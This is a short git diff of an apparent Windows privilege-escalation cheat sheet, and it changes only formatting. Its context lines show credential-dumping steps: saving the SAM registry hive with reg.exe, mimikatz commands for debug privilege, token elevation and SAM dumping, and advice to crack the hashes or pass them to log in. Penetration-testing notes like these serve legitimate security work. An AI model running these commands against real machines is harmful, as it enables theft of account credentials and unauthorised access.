@@ -71,6 +71,7 @@ https://lolbas-project.github.io/#
     %SYSTEMROOT%\System32\config\RegBack\system 
 ### Extracting SAM and SYSTEM 
 Manually or use [mimikatz](https://github.com/gentilkiwi/mimikatz) 
+
 Manually:
 
      reg.exe save HKLM\SAM sam.bak 
@@ -83,7 +84,8 @@ Mimikatz:
      privilege::debug 
      token::elevate 
      lsadump::sam  
-     *then crack hashes or use pass the hash to login* [Online hash cracker](https://crackstation.net/) 
+     
+*then crack hashes or use pass the hash to login* [Online hash cracker](https://crackstation.net/) 
 
 ## Kernel exploits   
     systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   
